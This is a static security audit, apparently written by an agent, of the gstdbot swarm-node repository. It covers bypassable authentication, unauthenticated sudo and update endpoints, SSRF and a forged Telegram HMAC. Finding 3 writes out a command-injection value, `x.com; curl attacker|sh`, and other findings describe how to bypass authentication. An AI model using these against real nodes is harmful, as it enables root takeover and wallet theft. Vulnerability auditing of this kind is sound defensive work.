# THE 50 / W7 / T34 - gstdbot swarm audit (267 files)

- **Task:** THE 50 program item 34 (`watch/inbox/THE_50_PROGRAM_20260918.md:53`, W7 GSTD/EXTERNAL)
- **Date:** 2026-09-25 (full re-verification of the 2026-09-19 draft at this same path; every line citation below was re-read on disk this session)
- **Subject:** `reference/gstdcoin/gstdbot/` (local clone of github.com/gstdcoin/gstdbot, per `docs/ref/GSTDCOIN_REPOS_INDEX.md:17`)
- **Scope, re-measured this session:** `find . -type f` = 299 total; excluding `.git/` = 270; excluding the 5 `.mimosa/` receipt files the audit tooling itself wrote = **265 tree files**. The task's "267" came from the 2026-09-19 pass counting 265 files plus 2 `scripts/__pycache__/*.pyc` that no longer exist (verified: `find . -name "*.pyc"` returns nothing). Breakdown of the 265: 171 .md, 62 .ts, 3 .json, 7 .sh, 3 .yml, 2 .py, 2 .service, 2 .js, 2 .html, plus config/web assets. (.json corrected 8 -> 3 on 2026-09-26: the 8 had absorbed the 5 excluded .mimosa receipts; fresh find names exactly package.json, package-lock.json, tsconfig.json. Cause: wave-2 audit batch 6.4, `watch/inbox/MICKEY17_WAVE2_QUALITY_20260925.md`.) `git status --porcelain` shows only untracked `.mimosa/`, so the tree matches the commit exactly.
- **Provenance (ran `git log --oneline -5` and `git remote -v` in the clone this session):** tip `57f2b5e` "security: auth-gate destructive endpoints, fix duplicate git-reset bug, widen timeouts" (`57f2b5e118a4e7636c217714914b2a3ce37ebac6`); remote `https://github.com/gstdcoin/gstdbot.git`.

**Verdict:** working swarm-node code with real operational polish (rate limits, PIN migration, update snapshot/rollback), but the auth model is bypassable in one request, several destructive endpoints shipped unauthenticated, and nodes sit on 0.0.0.0 behind a public Cloudflare quick tunnel by default. For a "Node OS" that holds a TON wallet and drives Docker, that is node-takeover territory, not nits. The token economy on the node side is largely self-reported and simulated.

---

## Method (what was actually run this session)

1. Scope census: `find` counts and extension breakdown (numbers above); `git log --oneline -5`, `git remote -v`, `git rev-parse HEAD`, `git status --porcelain`.
2. Pattern sweep over all 85 code files (.ts/.js/.mjs/.py/.sh/.yml/.json/.service/.example/.html/Dockerfile/.env.example), run via repo venv python with regexes for: child_process (37 hits), sudo (74), curl|bash (29), private-key/mnemonic naming (30), 0.0.0.0 binds (14), Math.random (10), eval/Function (1, a PyTorch `model.eval()` false positive), rejectUnauthorized:false (0), chmod 777 (0). Counts differ from the 2026-09-19 draft because the regexes and file set are mine; the shape is the same.
3. Route census: `grep -cE "app\.(get|post|put|delete|patch|use)\("` counts **170** route registrations in `src/gateway/server.ts` (the draft said 164 under a narrower regex). `grep -n "requireNodeAuth"` shows 1 definition (line 170) and exactly 7 call sites: `src/gateway/server.ts:473, 1765, 1796, 1803, 1810, 2656, 2690`.
4. Targeted reads of every hit that mattered: `src/gateway/server.ts` (auth, wallet-login, SSL, SSH/OS, update, telegram, premium, WS, CORS, bind), `src/dashboard/server.ts`, `src/swarm/agent.ts`, `src/apps/manager.ts`, `src/compute/marketplace.ts`, `src/coverage/relay.ts`, `src/channels/miniapp.ts`, `src/skills/marketplace.ts`, `src/security/hardening.ts`, `src/wallet/{manager,wallet,tonconnect}.ts`, `src/revenue/engine.ts`, `src/index.ts`, `src/p2p/node.ts`, `src/node-lite/index.ts`, `src/gateway/fastify.ts`, `src/validators/manager.ts`, `src/index.test.ts`, plus `tunnel.sh`, `ecosystem.config.js`, `Dockerfile`, `docker-compose.yml`, `package.json`, `README.md`, `.env.example`, `web/dashboard.html`.

No dynamic testing was run (no node started, no requests fired, no dependency install); this is a static audit of the tree at commit `57f2b5e`.

---

## P0 - remote compromise of a running node

**1. Dashboard auth is bypassable with a forged "wallet signature" (no public-key crypto).**
`src/gateway/server.ts:2354-2378`: `/api/auth/wallet` "verifies" `signature` as `sha256(address + ':' + timestamp + ':gstd-node-auth')` (`src/gateway/server.ts:2367`). The secret is a constant in a public repo, so anyone can mint a valid signature for any address. `src/gateway/server.ts:2374` grants `owner` when the node wallet is unset, and `src/gateway/server.ts:2375-2377` returns a full session token. `requireNodeAuth` (`src/gateway/server.ts:170-177`) only checks token existence, never role, so even a "viewer" token passes every destructive gate. This one endpoint voids the entire PIN system.

**2. Destructive endpoints shipped without the auth gate.** Only 7 of 170 routes call `requireNodeAuth` (census in Method). Ungated, state-changing, all read this session:
- `POST /api/system/ssh/harden` rewrites sshd via sudo (`src/gateway/server.ts:2727-2742`);
- `POST /api/system/update-os` runs `sudo apt-get upgrade -y` (`src/gateway/server.ts:2744-2755`);
- `POST /api/update/component` does `git reset --hard` + `git pull` + `npm install` + `npx tsc` then `process.exit(0)` (`src/gateway/server.ts:1365-1391`);
- `POST /api/telegram/link` overwrites the linked Telegram account (`src/gateway/server.ts:1210-1217`);
- `POST /api/auth/reset-pin-request` / `reset-pin-confirm`: reset code is `Math.random()` 6 digits (`src/gateway/server.ts:1231`, `1356`), confirm has no attempt counter or lockout (`src/gateway/server.ts:1256-1281`), so the 10^6 space is brute-forceable through the tunnel;
- `POST /api/telegram/webhook` has no `X-Telegram-Bot-Api-Secret-Token` check (`src/gateway/server.ts:1284-1362`); command handling is gated only by `chatId === linkedTelegram.chatId` (`src/gateway/server.ts:1291`) and `/restart`, `/update`, `/pin_reset` are live handlers (`1314-1358`). Chat ids are low-entropy, and the unauthenticated `/api/telegram/link` above lets an attacker re-point the link to their own chat first, which turns this into full remote command execution over the node's update/restart path.
The repo's own comment at `src/gateway/server.ts:164-169` states the node sits behind a public Cloudflare tunnel where every request "looks local", so these endpoints are internet-reachable by design.

**3. Command injection in SSL setup: user-supplied `email`/`domain` interpolated into sudo shell strings.**
`src/gateway/server.ts:2397-2416`: `/api/ssl/setup` builds `sudo certbot ... -m ${email} -d ${domain}` and `sudo cp /etc/letsencrypt/live/${domain}/...` (`src/gateway/server.ts:2409-2412`) and runs them with `execSync` (`2415`). Unauthenticated. A `domain` like `x.com; curl attacker|sh` executes as root on hosts where the node user has sudo.

**4. A second unauthenticated control server with its own update endpoint.**
`src/dashboard/server.ts:320-344`: `POST /api/node/control` action `update` runs `git pull` + `npx tsc` (`src/dashboard/server.ts:335-337`), with no auth check anywhere in the file; the server binds `0.0.0.0` by default (`src/dashboard/server.ts:120`) and sends `Access-Control-Allow-Origin: *` (`126`). Fixing the gateway alone leaves this door open.

**5. Public exposure is the default posture.**
Binds: `src/index.ts:121`, `src/gateway/server.ts:4546`, `src/gateway/fastify.ts:22`, `src/dashboard/server.ts:120` (all `0.0.0.0`), plus the P2P listener `/ip4/0.0.0.0/tcp/...` (`src/p2p/node.ts:194`). `src/node-lite/index.ts:96-101` opens a Cloudflare quick tunnel, and the swarm agent publishes the resulting public URL to the platform as `node_url` (`src/swarm/agent.ts:338-345`, reading `/tmp/gstd_tunnel_url.txt` at `339`) so every node advertises its API to the internet. CORS is `Access-Control-Allow-Origin: *` (`src/gateway/server.ts:1394-1400`), so any webpage the operator visits can drive localhost:18789 and read responses. The WebSocket endpoint accepts connections with no token (`src/gateway/server.ts:3813-3818`).

## P1 - high

**6. PIN storage is a fast hash with a public static salt.** `src/gateway/server.ts:140-142`: `sha256(pin + 'gstd-node-salt-2026')`. 4-8 digit space, no KDF, salt identical fleet-wide; hash file plus this repo equals the PIN. Session tokens are also accepted via URL query string (`src/gateway/server.ts:171`), which leaks into logs and proxies. (Login rate limiting exists at `src/gateway/server.ts:180-192`, but the reset path at finding 2 bypasses the need to guess the PIN at all.)

**7. Platform + git repo jointly own every node's code and uptime.** Heartbeat responses can carry `commands` which the node executes (`src/swarm/agent.ts:370-374`); the switch allowlist (`src/swarm/agent.ts:495-533`) is health/diagnostics/restart/stop/update, and `update` triggers `tryAutoUpdate`: `git reset --hard origin/main` (`src/swarm/agent.ts:449`) + `npm install` + `tsc` + restart (`454-455`, `488`). Same pattern in `src/index.ts:504-546` (reset at `539`) and in the gated dashboard routes (`src/gateway/server.ts:1778-1781`, `2671-2673`). The agent even prints `curl -fsSL ${result.update.update_url} | bash` with a platform-supplied URL (`src/swarm/agent.ts:380`). No signature on the commands channel; TLS to app.gstdtoken.com is the only trust. Any push to the upstream repo auto-deploys to every online node. (The update path itself is careful: snapshot, ancestor check, build verify, rollback at `src/swarm/agent.ts:423-477`. The problem is who can pull the lever, not the mechanism.)

**8. App store pulls remote registry manifests into root-Docker string commands.** Registry is `https://app.gstdtoken.com/api/v1/apps/registry` (`src/apps/manager.ts:964`, fetched at `1020`); install runs `docker pull ${manifest.docker!.image}` (`src/apps/manager.ts:1223`) and `docker volume create ${volName}` (`1231`); start builds `docker run -d ... ${ports} ${volumes} ${envs} ... ${m.image}` by raw string join (`src/apps/manager.ts:1329-1337`). Registry-controlled fields reach a host shell. `POST /api/apps/install` is unauthenticated (`src/gateway/server.ts:1946`). Meanwhile a proper sandbox builder exists and is never called: `generateSandboxedCmd` with `--cap-drop=ALL --read-only --tmpfs ...` (`src/security/hardening.ts:269-287`) has zero callers (grep this session: definition only).

**9. Compute marketplace executes job-supplied shell in a container, with an injectable image string.** `src/compute/marketplace.ts:361-388`: `runDockerJob` takes `data.requirements.docker_image` (`362`), joins it unquoted into the docker command (`369-376`, image at `374`) and runs `sh -c <job command>` (`375`) under `exec()` (`379`). Container limits exist (`--memory=2g --cpus=2 --network=none`, `371-372`) but the unquoted image field lets shell metacharacters escape to the host. The sibling `runGenericJob` honestly comments "Simulate workload" and returns a fabricated result hash (`src/compute/marketplace.ts:390-395`).

**10. Every node is an open HTTP relay with SSRF guard gaps.** `/relay/proxy` is mounted on the gateway (`src/index.ts:279`) and enabled unless `GSTD_RELAY_ENABLED=false` (`src/coverage/relay.ts:56`, mount guard `82-83`). The blocklist checks hostname strings only (`src/coverage/relay.ts:95-98`) while `fetch()` follows redirects by default (`104`), so an allowlisted URL can 302 to `169.254.169.254`, and DNS names that resolve into private space pass `isPrivateIp` (`src/coverage/relay.ts:30-38`). Combined with the published tunnel URL (finding 5), strangers get a free open proxy that also mints "relayed GB" earnings (`src/coverage/relay.ts:117-119`).

**11. Telegram Mini App HMAC validation is bypassed by its own dev fallback.** `src/channels/miniapp.ts:650-684`: `validateInitData` computes the correct HMAC (`662-668`), then on mismatch accepts any request that merely contains a `user` param ("In development, accept if user data is present", `670-676`). Shipped in the default build (`GSTD_MOBILE_NODE !== 'false'`, `src/index.ts:143-145`; routes registered at `src/index.ts:331-340`), gating `/tma/node/claim` (`src/channels/miniapp.ts:320`), `/tma/node/task/complete` (`288`), `/tma/node/link-wallet` (`236`) via the `validateTMA` middleware (`86-97`). Earnings and wallet-linking are forgeable by header.

**12. Skill import pulls arbitrary GitHub/URL content into the agent's prompt brain.** `src/skills/marketplace.ts:156-175` accepts any URL or `user/repo`; `git clone --depth 1 ${cloneUrl}` (`217`) into the skills dir. The only screen, `scanSkill` (`353-380`), is an advisory regex list whose hits merely become warning strings, and its only caller is the CLI (`src/cli/index.ts:512`), not the import path. Installed skills are listed into the agent (`src/agent/agent.ts:15`), i.e. a prompt-injection channel with no signing or review.

**13. The flagship inference API is free and keyless while the "free tier" demands 10k GSTD.** `POST /v1/chat/completions` checks no credential at all (`src/gateway/server.ts:769-841`) and routes through the same router as `/api/v1/free-api/chat`, which gates on a 10,000 GSTD balance (`freeApiRequiredBalance = 10_000` at `src/gateway/server.ts:238`; checks at `1008-1024` and `1042-1065`). The dashboard teaches users the key `gstd-node` (`web/dashboard.html:1448` and `1452-1456`), a decoration. Any stranger with the node URL gets open LLM compute on the operator's hardware.

## P2 - economy integrity / honesty gaps

**14. The premium validator/training/task economy is forgeable and in-memory.** Signatures use the same public-constant scheme with `':gstd-premium'` (`src/gateway/server.ts:2796-2799`); tier registries are plain in-memory objects (`2763-2785`); `verifyWalletBalance` returns the node's own balance and 0 for everyone else, with the external check deferred as a "production" note (`2787-2794`). The premium app gate reads the node's own wallet (`src/gateway/server.ts:1966-1972`).

**15. "Settled on-chain" is a self-reported API post.** `src/revenue/engine.ts:15` promises settlement "via SettlementRouter.tact (real GSTD transfer)"; `settlePending` (`src/revenue/engine.ts:200`, body `213-233`) just POSTs node-computed totals with an `X-Wallet-Address` header and records whatever string comes back as `txHash` (`result.tx_hash || result.batch_id`, `241`). Earnings are self-attested end to end.

**16. Built-in app installs are theater.** Non-Docker "installs" run fake progress steps on `500 + Math.random()*300` ms timers and write toy JSON (`store.json` = `'[]'` at `src/apps/manager.ts:1246`; a `keyring.json` with a random hex "pubkey" at `1250-1252`) for apps advertised as real services (e.g. the passwords app, `src/apps/manager.ts:184`).

**17. Wallet "encrypted at rest" is half true, and the encryption is weak where it exists.** Corrected from the 2026-09-19 draft, which said the claim had "no code behind it"; that is wrong for the primary wallet: `src/wallet/wallet.ts:54-60` implements real AES-256-CBC `encryptSeed`, written to `wallet_seed.enc` with chmod 600 (`src/wallet/wallet.ts:150-151`, `185-186`). The actual flaw: the key is `sha256(/etc/machine-id + ':gstd-wallet-v3')` (`src/wallet/wallet.ts:42-49`), a public constant plus a file any local user can read, so the at-rest encryption stops nothing beyond a naive file grab; without `/etc/machine-id` it degrades to the home directory path. Separately: the TonConnect side never persists at all (`MemoryStorageAdapter`, `src/wallet/tonconnect.ts:126`) despite the interface comment "encrypted at rest" (`src/wallet/tonconnect.ts:27`), and the plaintext env path `GSTD_WALLET_MNEMONIC` is live (`src/index.ts:325`). The `SecurityHardening` module's encrypt/decrypt (`src/security/hardening.ts:185-201`) still has no callers; the module is instantiated (`src/index.ts:349`), stored (`src/gateway/server.ts:221`, set at `306`), and only read by a status endpoint (`src/gateway/server.ts:2242-2248`), so its rate limiting, ban list, and signature verify are dead code.

**18. Docs overstate security.** `README.md:46`: "Security Layer - AES-256, brute-force lockout, SSH hardening" (the SSH hardening endpoint is itself unauthenticated, finding 2). `.env.example:62-66` advertises "hardened by default" with the same items. `.env.example:45` says `GSTD_MEMORY=false ... Set true only if a local Redis server is running`, but the code default is ON (`process.env.GSTD_MEMORY !== 'false'`, `src/index.ts:132`).

## P3 - quality (compact)

- **Test suite is one tautology**: `src/index.test.ts:3-8` asserts `'GSTD' === 'GSTD'`; that is the whole suite behind the `vitest run` script (`package.json:17`) for 62 source files.
- **CIDR bug**: `src/security/hardening.ts:260` treats any `172.*` IP as trusted (that is a /8, not 172.16/12; 172.32.x is public). `src/coverage/relay.ts:30-38` does the same check correctly.
- **Literal NUL byte in source**: `src/p2p/node.ts:519` contains a real 0x00 inside the control-char regex (verified by byte scan this session: offset 21540, line 519); text tools treat the file as binary.
- **Duplicate route**: `POST /api/memory/recall` registered twice (`src/gateway/server.ts:2080` and `4394`); the second handler is dead (Express first-match).
- **Operator infra leaked in public repo**: `tunnel.sh:7` hardcodes a Vercel project id `prj_j2gQqRULHdMowbDHZt7wSqs2z3Bf` and `/home/bot/...` paths (`tunnel.sh:8`; also `ecosystem.config.js:28,46,61,75` and the nvm interpreter at `76`); `src/swarm/agent.ts:339` reads the `/tmp/gstd_tunnel_url.txt` file it writes.
- **Math.random for security-adjacent codes**: reset codes (`src/gateway/server.ts:1231`, `1356`); crypto-grade `randomBytes` is used for session tokens (`src/gateway/server.ts:143-145`), so the fix is local.
- **Root container**: `Dockerfile` has no `USER` directive (grep count 0 this session) and ships the full API; `docker-compose.yml:15-16` publishes 8080 on all host interfaces.
- **Boot-node downloads**: `src/validators/manager.ts:344-362` pipes `curl | tar` release binaries (TON lite-client, Helios, Bitcoin Core 28.0) to disk + chmod; URLs are project/vendor-controlled constants, but there is no checksum pinning.

## Corrections vs the 2026-09-19 draft at this path

1. **Finding 17 inverted in part**: seed-at-rest encryption exists (`src/wallet/wallet.ts:54-60,150-151`); the real issue is the machine-id-derived key. Draft's "no code behind it" was false; this version states what the code actually does.
2. **Telegram webhook nuance**: the draft said webhook commands "can be spoofed by anyone"; handlers are gated by chat-id equality (`src/gateway/server.ts:1291`). The attack still works by first re-linking via the unauthenticated `/api/telegram/link` (`1210-1217`), which the draft listed but did not connect.
3. **Scope count**: 265 tree files today; the 2 `.pyc` files behind the draft's 267 are gone; the 5 `.mimosa/` receipts are this audit's own tooling and were excluded.
4. **Minor citation drift fixed**: route count 170 (draft 164), test script `package.json:17` (draft 26), relay `isPrivateIp` at `relay.ts:30-38` (draft 32-41), wallet-seed reality per above.

## Not audited / limits

- No dynamic testing: node never started, no requests fired, no dependency install (node_modules absent). All findings are static reads of the cloned tree at commit `57f2b5e`.
- `package-lock.json` (dependency tree) not audited for compromised versions; upstream dependency risk unassessed.
- The 171 skills/docs .md files were pattern-scanned only (no secret or curl|bash hits in the sweep); content quality not reviewed beyond confirming `skills/token-analyzer/SKILL.md` exists.
- Platform-side code (app.gstdtoken.com backend) is not in this tree; findings 7, 10, 14, 15 name the trust boundary but the server half is unverifiable from here.

## Fleet relevance (for the next seat)

Per `docs/ref/GSTDCOIN_REPOS_INDEX.md:17,29`, Mag's planned slot for gstdbot is "P2P swarm node; janitor/scut at network edge". Audit says: do not run this code as-is on any machine holding keys, ports, or Docker. If the GSTD forest pipe needs its patterns, steal the good parts (heartbeat retry timing comments at `src/swarm/agent.ts:390-394`, update snapshot/rollback shape at `src/swarm/agent.ts:423-477`, P2P schemas in `src/p2p/node.ts`) and leave the auth model, app store, and relay behind. W7 task 32 (TON explorer probe) and task 35 (treasury vs seal law) can cite findings 14-15 as node-side evidence that GSTD accounting is self-attested.
